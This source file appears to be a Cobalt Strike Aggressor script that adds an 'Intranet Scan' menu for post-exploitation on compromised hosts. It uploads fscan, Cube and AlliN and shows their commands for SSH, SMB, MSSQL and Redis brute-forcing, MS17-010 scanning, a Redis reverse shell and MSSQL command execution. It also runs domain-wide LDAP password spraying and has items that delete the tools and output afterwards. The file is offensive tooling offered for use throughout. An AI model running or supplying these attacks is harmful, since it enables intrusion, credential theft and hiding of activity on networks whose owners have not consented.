menu "Intranet Scan" {
  menu "Fscan (Intranet Health Care with Fscan)" {
    item "Upload Fscan" {
			blog($1, "\c9=========== Upload Fscan ==========");
      $bid = $1;
      $dialog = dialog("Upload fscan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &fscan);
      dialog_description($dialog, "Support host survival detection, port scanning, bursting of common services、ms17010、redisBatch write private keys, schedule tasks to bounce shells, read win NIC information, etc. Project address：https://github.com/shadow1ng/fscan");
      drow_text($dialog, "UploadPath",  "Upload path: ");
      dbutton_action($dialog, "Upload");
      dialog_show($dialog);
    }
    sub fscan {
      bcd($bid, $3['UploadPath']);
      if (-is64 $bid['id']) {
        bupload($bid, script_resource("/scripts/IntrScan/x64/fscan.exe"));
      }else{
        bupload($bid, script_resource("/scripts/IntrScan/x86/fscan.exe"));
      }      
    }
    
    item "Run Fscan" {
			blog($1, "\c9=========== Run Fscan ==========");
      $bid = $1['@'];
      btask($bid, "Fscan", "");      
      btask($bid, "fscan.exe -h 192.168.1.1/24                                    (Use all modules by default)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/16                                    (B-segment scanning)", "");
      btask($bid, "Other Uses：", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -np -no -nopoc                     (Skip survival detection, no file saving, skip web poc scans)", "");            
      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub                     (redis Write public key)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666               (redis Planned Task Rebound shell)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt     (Load the username and password of the specified file for blasting)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt                      (Specify the path to save the scan results, the default is saved in the current path)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/8                                     (a segment of 192.x.x.1 and 192.x.x.254, easy to quickly view the network segment informations)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -m smb -pwd password               (smb Password collision)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami                          (ssh After a successful blast, the command is executed)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222                     (Specify module ssh and port)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010                         (Specify module)", "");
      btask($bid, "fscan.exe -h 192.0.0.0/8 -m icmp                               (probe each C segment gateway and several random IP, and statistics top 10 B, C segment survival number)", "");
      btask($bid, " ", "");
      btask($bid, "fscan.exe -h      (View full usage)", "");
      $dialog = dialog("Run fscan",%(exec => "fscan.exe -h 192.168.1.1/24 -o out.txt", bid => $bid),&fscan_run);
      dialog_description($dialog, "Please enter the run command below：");
      drow_text($dialog, "exec", "Exec: ");
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    sub fscan_run{
      $exec = $3['exec'];
      brun($bid, "$exec");
    }
    item "Delete Fscan" {
			blog($1, "\c9=========== Delete Fscan ==========");
      $bid = $1['@'];
      bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe & del /f /s /q out.txt");
    }
  }
	item "Ladon Multi-protocol Survival Detection" {
    #OnlinePC
    $bid = $1;
    $dialog = dialog("Ladon OnlineIP", %(tar => "192.168.1.1/24",moudle => "OnlineIP",clrver => "35",bid => $bid), &LadonScan);
    dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
    drow_text($dialog, "tar",  "Target:");
    drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","EthScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
    #drow_combobox($dialog, "clrver", "Version", @("35", "40"));
    drow_checkbox($dialog, 'type', 'noping');
    dbutton_action($dialog, "Scan");
    dialog_show($dialog);
	}
sub LadonScan {
	if (-exists script_resource("/scripts/InfoCollect/Ladon.exe")) {
    if ($3['tar'] eq ""){
      return;
    }else
    {
    if ($3['type'] eq 'true'){
      blog2($bid,"\c2Ladon noping ".$3['tar'].' '.$3['moudle']);
      bexecute_assembly!($bid, script_resource("/scripts/InfoCollect/Ladon.exe"),'noping '.$3['tar'].' '.$3['moudle']);
    }else
    {
      blog2($bid,"\c2Ladon ".$3['tar'].' '.$3['moudle']);
      bexecute_assembly!($bid, script_resource("/scripts/InfoCollect/Ladon.exe"), $3['tar'].' '.$3['moudle']);}}
    }else {berror($1, "Ladon.exe does not exist :(");}
}

  menu "Cube Modular detection"{
    item "Upload Cube" {
			blog($1, "\c9=========== Upload Cube ==========");
      $bid = $1;
      $dialog = dialog("Upload Cube", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &cube_upload);
      dialog_description($dialog, "Intranet penetration testing tools, weak password blasting, information gathering and vulnerability scanning. Project Address：https://github.com/JKme/cube");
      drow_text($dialog, "UploadPath",  "Upload path: ");
      dbutton_action($dialog, "Upload");
      dialog_show($dialog);
    }
    sub cube_upload {
      bcd($bid, $3['UploadPath']);
      if (-is64 $bid['id']) {
        bupload($bid, script_resource("/scripts/IntrScan/x64/cube.exe"));
      }else{
        bupload($bid, script_resource("/scripts/IntrScan/x86/cube.exe"));
      }      
    } 
    item "Run Cube" {
			blog($1, "\c9=========== Run Cube ==========");
      $bid = $1['@'];
      btask($bid, "", "");
      btask($bid, "- Probe Intranet Information Collection Module", "");
      btask($bid, "ALL option loads plugins by default: docker,rmi,oxid,netbios,ntlm-smb,zookeeper", "");
      btask($bid, "Other available plugins: netbios, ms17010, smbghost, ntlm-wmi，ntlm-winrm，ntlm-mssql，dubbo，ping", "");
      btask($bid, "cube.exe probe -x ALL -i 192.168.2.1/24", "");     
      btask($bid, "cube.exe probe -x oxid -i 192.168.2.1/24", "");
      btask($bid, "cube.exe probe -x oxid,ms17010 -i 192.168.2.1/24", "");
      btask($bid, "", "");
      btask($bid, "- Crack Weak Password Blasting Module", "");
      btask($bid, "Available plugins: ssh, mysql, redis, elastic, ftp, httpbasic, mongo, mssql, smb, postgres", "");
      btask($bid, "cube.exe crack -u root -p root -i 192.168.1.1 -x ALL //Load all combinable plug-ins", "");            
      btask($bid, "cube.exe crack -u root -p root -i 192.168.1.1 -x ssh", "");
      btask($bid, "cube.exe crack -u root -p root -i 192.168.1.1 -x ssh --port 2222", "");
      btask($bid, "cube.exe crack -u root,ubuntu -p 123,000111,root -x ssh -i 192.168.1.1", "");
      btask($bid, "cube.exe crack -u root -p root -i 192.168.1.1/24 -x ssh", "");
      btask($bid, "cube.exe crack -u root --pass-file pass.txt -i 192.168.1.1/24 -x ssh,mysql", "");
      btask($bid, "phpmyadmin、httpbasic、jenkins、zabbixPlug-ins can only be used individually, not in combination", "");
      btask($bid, "cube.exe crack -u root --pass-file pass.txt -i http://192.168.1.1 -x phpmyadmin", "");
      btask($bid, "cube.exe crack -u root --pass-file pass.txt -i http://192.168.1.1 -x zabbix", "");
      btask($bid, "", "");
      btask($bid, "- Sqlcmd Command Execution Module", "");
      btask($bid, "cube.exe sqlcmd -x mssql://172.16.157.163 -usa -p123456 -e \"whoami\"", "");
      btask($bid, "cube.exe sqlcmd -x mssql-wscript://172.16.157.163 -usa -p123456 -e \"whoami\"", "");
      btask($bid, "cube.exe sqlcmd -x mssql-com://172.16.157.163 -usa -p123456 -e \"whoami\"", "");
      btask($bid, "cube.exe sqlcmd -x mssql-clr://172.16.157.163 -usa -p123456 -e \"whoami\"", "");
      $dialog = dialog("Run Cube",%(exec => "cube.exe probe -x ALL -i 192.168.1.1/24", bid => $bid),&cube_run);
      dialog_description($dialog, "Please enter the run command below:");
      drow_text($dialog, "exec", "Exec: ");
      dbutton_action($dialog, "Run");
      dialog_show($dialog);   
    }
    sub cube_run{
      $exec = $3['exec'];
      brun($bid, "$exec");
    }
    item "Delete Cube" {
			blog($1, "\c9=========== Delete Cube ==========");
      $bid = $1['@'];
      bshell($bid, "taskkill -f /im cube.exe & del /f /s /q cube.exe");
    }
  }

  menu "Allin Auxiliary flexible scanning"{
    item "Upload Allin" {
			blog($1, "\c9=========== Upload Allin ==========");
      $bid = $1;
      $dialog = dialog("Upload Allin", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &allin_upload);
      dialog_description($dialog, "One Python Edition has no dependent scanner, and some architecture information, component information, framework information, fingerprint number of passive identification sites量1000+。project address：https://github.com/P1-Team/AlliN");
      drow_text($dialog, "UploadPath",  "Upload path: ");
      dbutton_action($dialog, "Upload");
      dialog_show($dialog);
    }
    sub allin_upload {
      bcd($bid, $3['UploadPath']);
      if (-is64 $bid['id']) {
        bupload($bid, script_resource("/scripts/IntrScan/x64/Allin.exe"));
      }else{
        bupload($bid, script_resource("/scripts/IntrScan/x86/Allin.exe"));
      }      
    } 
    item "run Allin" {
			blog($1, "\c9=========== Run Allin ==========");
      $bid = $1['@'];
      btask($bid, "Detailed instructions for use: https://github.com/P1-Team/AlliN", "");
      btask($bid, "AlliN.exe -m oxid --host 192.168.1.1/24 --nobar                  (Get remote host NIC address)", "");  
      btask($bid, "AlliN.exe --host 10.1.1.1/24 -m 17scan --nobar                   （17010 (Scan)", "");
      btask($bid, "AlliN.exe --host 192.168.1.1/24 -m 0708scan -p 3389 --nobar      （0708 Scanning）", "");
      btask($bid, "AlliN.exe --host 10.1.1.1/24 -p 80 -m pscan --nobar              （-p all ports -p-）", "");
      btask($bid, "AlliN.exe --host 10.1.1.1/24 -p 80 --nobar                       （Web title Scanning）", "");
      btask($bid, "AlliN.exe --host 192.168.1.1/24 -p 443 -m bakscan --nobar        （Scan Back Office）", "");
      btask($bid, "AlliN.exe --host 192.168.1.1/24 -p 443 -m bakscan --dd --nobar   （head Way to sweep the background）", "");  
      $dialog = dialog("Run Allin",%(exec => "AlliN.exe -m oxid --host 192.168.1.1/24 --nobar", bid => $bid),&allin_run);
      dialog_description($dialog, "Please make sure the --nobar parameter is added after entering the command：");
      drow_text($dialog, "exec", "Exec: ");
      dbutton_action($dialog, "Run");
      dialog_show($dialog);   
    }
    sub allin_run{
      $exec = $3['exec'];
      brun($bid, "$exec");
    }
    item "Delete Allin" {
			blog($1, "\c9=========== Delete Allin ==========");
      $bid = $1['@'];
      bshell($bid, "taskkill -f /im Allin.exe & del /f /s /q Allin.exe");
    }
  }

  item "SharpOXID-Find OXID Detection" {
			blog($1, "\c9=========== SharpOXID-Find (OXID Detection) ==========");
      $bid = $1['@'];
      $dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
      dialog_description($dialog, "OXID Parser for probing multi-port machines (dependent on port 135),-i scan for specified ip,-c scan for C-segment.");
      drow_combobox($dialog, "type", "type:", @("-c","-i"));
      drow_text($dialog, "ip", "ip:  ");			
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
  }
  sub SharpOXID-Find {
      $arg = join(' ',  @($3['type'],$3['ip']));
      bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpOXID-Find.exe"), $arg);
  }

  item "SharpWebScan Web Detection" {
			blog($1, "\c9=========== SharpWebScan (Web Detection) ==========");
    $bid = $1['@'];
    $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
    dialog_description($dialog, "Scan IP or C segment for web services, get Title, customizable multi-port scan, return web address and title. project addresss：https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
    drow_text($dialog, "ip", "ip:  ");
    drow_text($dialog, "port", "ports:  ");
    drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
  }
  sub SharpWebScan (Web Services) {
    $arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
    bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpWebScan.exe"), $arg);
  }

  item "SharpSpray (The password spay in the domain)" {
			blog($1, "\c9=========== SharpSpray (Intra-domain password spraying) ==========");
    $bid = $1['@'];
    $dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
    dialog_description($dialog, "Use LDAP to perform a password spray attack on all users of the domain。seeds：Specify several passwords to generate a dictionary, comma separated。passwords：Specify Password Blast，Multiple passwords possible, comma separated。delay：Delay of password spray, in milliseconds。sleep：Number of sleep cycle minutes between password guesses. Project address：https://github.com/jnqpblc/SharpSpray");
    drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
    drow_text($dialog, "passwd", "passwd:  ");
    drow_text($dialog, "Delay", "Delay:  ");
    drow_text($dialog, "Sleep", "Sleep:  ");
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
  }
  sub SharpSpray {
    $arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
    bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpSpray.exe"), $arg);
  }

}
